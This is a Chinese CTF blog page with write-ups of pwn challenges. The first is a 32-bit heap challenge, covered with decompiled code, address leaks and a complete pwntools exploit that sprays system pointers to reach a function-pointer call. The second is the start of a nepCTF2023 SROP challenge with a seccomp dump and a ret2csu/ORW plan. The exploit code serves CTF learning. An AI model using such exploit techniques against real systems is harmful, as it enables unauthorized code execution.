<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">main: ELF <span class="number">32</span>-bit LSB shared object, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-linux.so<span class="number">.2</span>, BuildID[sha1]=efe84eed376bd21cda8887c5de4e43ec76f723ac, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>32位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>程序可以执行函数指针：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index &lt;= <span class="number">0xFFF</span> &amp;&amp; chunk_list[index].data )</span><br><span class="line">&#123;</span><br><span class="line">  func = chunk_list[index].space + chunk_list[index].data;</span><br><span class="line">  <span class="keyword">if</span> ( **(_DWORD **)func )</span><br><span class="line">    --**(_DWORD **)func;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    (*(<span class="keyword">void</span> (__cdecl **)(<span class="keyword">const</span> <span class="keyword">char</span> *))(*(_DWORD *)func + <span class="number">4</span>))(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序的写入没有限制字节数，可以无限堆溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Please input your head data.&quot;</span>);</span><br><span class="line">reads(</span><br><span class="line">  *((<span class="keyword">char</span> **)&amp;chunk_list[<span class="number">0</span>].data + num_2 * (m + i * num_16)),</span><br><span class="line">  *(&amp;chunk_list[<span class="number">0</span>].space + (m + i * num_16) * num_2));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Which flag do you want?&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>申请模块中允许的 size 范围非常大，可以调用 mmap 进行申请：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( space &gt; <span class="number">0</span> &amp;&amp; space &lt;= <span class="number">0x20000</span> )</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>首先程序有一个小点需要注意：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Please input your head data.&quot;</span>);</span><br><span class="line">reads(</span><br><span class="line">  *((<span class="keyword">char</span> **)&amp;chunk_list[<span class="number">0</span>].data + num_2 * (m + i * num_16)),</span><br><span class="line">  *(&amp;chunk_list[<span class="number">0</span>].space + (m + i * num_16) * num_2));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Which flag do you want?&quot;</span>);</span><br><span class="line">key = readn();</span><br><span class="line">chunk = *(&amp;chunk_list[<span class="number">0</span>].space + (m + i * num_16) * num_2) + *(&amp;chunk_list[<span class="number">0</span>].data + num_2 * (m + i * num_16));</span><br><span class="line"><span class="keyword">switch</span> ( key )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    *(_BYTE *)chunk = (<span class="keyword">unsigned</span> __int8)flag1 + <span class="number">0xFFFFC064</span> + (<span class="keyword">unsigned</span> __int8)&amp;off_3F9C - <span class="number">4</span>;</span><br><span class="line">    *(_WORD *)(chunk + <span class="number">1</span>) = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)flag1 &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    *(_BYTE *)(chunk + <span class="number">3</span>) = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)flag1 &gt;&gt; <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>在读取函数 <code>reads</code> 中会对字符串末尾置零，而后续写入地址的操作会将这个 <code>\x00</code> 给覆盖掉</li>
</ul>
<p>利用这个特性可以轻松泄露程序基地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x28</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">pro_base = leak_addr - <span class="number">0x1524</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br></pre></td></tr></table></figure>
<p>用类似的方法可以泄露 libc_base：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x200</span>,<span class="string">&quot;a&quot;</span>*<span class="number">1</span>)</span><br><span class="line">dele()</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;Heap information is a&quot;</span>)</span><br><span class="line">p.recv(<span class="number">3</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x22a756</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>但如果想要在泄露 libc_base 的同时泄露 heap_base 的话，则需要一点技巧：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    ru(<span class="string">&quot;Heap information is &quot;</span>)</span><br><span class="line">    p.recv(<span class="number">4</span>)</span><br><span class="line">    leak_addr = u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> leak_addr</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">&quot;a&quot;</span>*<span class="number">1</span>)</span><br><span class="line">dele()</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = show(<span class="number">0</span>)</span><br><span class="line">libc_base = leak_addr - <span class="number">0x22a756</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_libc = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;system_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system_libc))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&quot;b&quot;</span>*<span class="number">1</span>)</span><br><span class="line">dele()</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line">heap_base = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    leak_addr = show(i)</span><br><span class="line">    <span class="keyword">if</span> leak_addr &lt; <span class="number">0x57000000</span> <span class="keyword">and</span> leak_addr &gt; <span class="number">0x54000000</span>:</span><br><span class="line">        heap_base = leak_addr - <span class="number">0x1956</span></span><br><span class="line">        heap_base = heap_base &amp; <span class="number">0xfffff000</span></span><br><span class="line">        success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">        success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">        key = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> key == <span class="number">0</span>:</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>
<p>接下来的操作就有点玄学了，我们先看一下后门函数的逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index &lt;= <span class="number">0xFFF</span> &amp;&amp; chunk_list[index].data )</span><br><span class="line">&#123;</span><br><span class="line">  func = chunk_list[index].space + chunk_list[index].data;</span><br><span class="line">  <span class="keyword">if</span> ( **(_DWORD **)func )</span><br><span class="line">    --**(_DWORD **)func;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    (*(<span class="keyword">void</span> (__cdecl **)(<span class="keyword">const</span> <span class="keyword">char</span> *))(*(_DWORD *)func + <span class="number">4</span>))(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>func 地址位于该 chunk 的末尾（就是写入函数指针的位置）</li>
<li>两次解引用后数值必须为“0”，如果数值“0”后是 system 就可以拿到 flag</li>
</ul>
<p>由于程序的申请操作受随机数影响，导致堆风水很乱，到这里时就只能尽可能多的写入 system 和 system 所在堆地址以提升打通的概率</p>
<ul>
<li>PS：有点像打内核题时用的堆喷技巧（kernel 的 slab/slub 对释放块有随机化保护，我猜题目也是为了模拟这一点）</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">32</span></span><br><span class="line">challenge = <span class="string">&#x27;./main&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1CA1)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choose :&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">space,data,flag=<span class="number">1</span></span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;need :&quot;</span>,<span class="built_in">str</span>(space))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        sla(<span class="string">&quot;data&quot;</span>,data)</span><br><span class="line">        sla(<span class="string">&quot;want?&quot;</span>,<span class="built_in">str</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    ru(<span class="string">&quot;Heap information is &quot;</span>)</span><br><span class="line">    p.recv(<span class="number">4</span>)</span><br><span class="line">    leak_addr = u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> leak_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>():</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">&quot;index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">&quot;a&quot;</span>*<span class="number">1</span>)</span><br><span class="line">dele()</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = show(<span class="number">0</span>)</span><br><span class="line">libc_base = leak_addr - <span class="number">0x22a756</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_libc = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;system_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system_libc))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&quot;b&quot;</span>*<span class="number">1</span>)</span><br><span class="line">dele()</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line">heap_addr = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    leak_addr = show(i)</span><br><span class="line">    <span class="keyword">if</span> leak_addr &lt; <span class="number">0x57000000</span> <span class="keyword">and</span> leak_addr &gt; <span class="number">0x54000000</span>:</span><br><span class="line">        heap_addr = leak_addr + <span class="number">0x4e5a</span></span><br><span class="line">        success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">        success(<span class="string">&quot;heap_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">        key = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> key == <span class="number">0</span>:</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line">dele()</span><br><span class="line">dele()</span><br><span class="line">dele()</span><br><span class="line">dele()</span><br><span class="line">dele()</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">payload = p32(heap_addr)*<span class="number">0x1000</span>+(p32(<span class="number">0</span>)+p32(system_libc))*<span class="number">0x1000</span></span><br><span class="line">add(<span class="number">0x8</span>,payload)</span><br><span class="line">action(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/07/nepCTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/07/nepCTF2023/" class="post-title-link" itemprop="url">nepCTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-09-07 22:03:22 / Modified: 22:08:12" itemprop="dateCreated datePublished" datetime="2023-09-07T22:03:22+08:00">2023-09-07</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>26k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>23 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.6</span>)</span> stable release version 2.27.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=b9a04d5b45791b795e9c72a0f443a391a5cd591a, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，NX</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000000f</span>  <span class="keyword">if</span> (A != rt_sigreturn) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"><span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>只能打 ORW</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>栈溢出 + syscall：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">seccomp(argc, argv, envp);</span><br><span class="line">syscall(<span class="number">1LL</span>, <span class="number">1LL</span>, bufg, <span class="number">0x30</span>LL);</span><br><span class="line"><span class="keyword">return</span> syscall(<span class="number">0LL</span>, <span class="number">0LL</span>, buf, <span class="number">0x300</span>LL);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>有栈溢出，可以打 ret2csu，先利用现成的 syscall 配合万能 pop 构造 read 函数，然后栈迁移到 bss 段打 ORW</p>
<p>完整 exp 如下：</p>
